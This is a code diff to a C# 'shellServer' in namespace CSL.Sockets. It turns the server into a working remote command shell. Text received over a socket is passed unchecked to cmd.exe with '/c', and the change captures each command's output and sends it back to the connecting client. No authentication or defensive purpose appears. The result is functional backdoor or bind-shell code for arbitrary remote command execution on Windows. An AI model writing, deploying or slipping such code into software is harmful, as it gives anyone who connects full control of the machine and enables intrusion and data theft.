@@ -6,6 +6,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace CSL.Sockets
 {
@@ -50,7 +51,20 @@ namespace CSL.Sockets
             }
         }
 
-        public static void shellServer(ServerInfo args)
+        public static async Task sender(Socket socket, string output)
+        {
+            ASCIIEncoding toSend = new ASCIIEncoding();
+            try
+            {
+                socket.Send(toSend.GetBytes(output));
+            } catch(Exception ex)
+            {
+                Console.WriteLine("Failed to send back to client");
+                socket.Send(toSend.GetBytes("Failed to send output to client"));
+            }
+        }
+
+        public static async Task shellServer(ServerInfo args)
         {
             IPAddress ip = IPAddress.Parse(args.target);
 
@@ -91,9 +105,12 @@ namespace CSL.Sockets
 
                     try
                     {
-                        ThreadStart th = new ThreadStart(() => process(endout));
-                        Thread t = new Thread(th);
-                        t.Start();
+                        string sendBack = process(endout);
+                        //ThreadStart th = new ThreadStart(() => process(endout));
+                        //Thread t = new Thread(th);
+                        //t.Start();
+
+                        await sender(socket, sendBack);
                     }
                     catch (Exception ex)
                     {
@@ -109,9 +126,31 @@ namespace CSL.Sockets
             }
         }
 
-        public static void process(string args)
+        public static string process(string args)
         {
-            Process.Start("CMD.exe", "/c" + args);
+            //Process.Start("CMD.exe", "/c" + args);
+
+            try
+            {
+                ProcessStartInfo exec = new ProcessStartInfo();
+                exec.FileName = $@"cmd.exe";
+                exec.Arguments = $@"/c " + args;
+                exec.UseShellExecute = false;
+                exec.RedirectStandardOutput = true;
+                using (Process process = Process.Start(exec))
+                {
+                    using (StreamReader reader = process.StandardOutput)
+                    {
+                        string result = reader.ReadToEnd();
+                        Console.Write(result);
+                        return result;
+                    }
+                }
+            } catch(Exception ex)
+            {
+                Console.WriteLine("Failed to execute command");
+                return "Failed to execute command";
+            }
         }
     }
 }
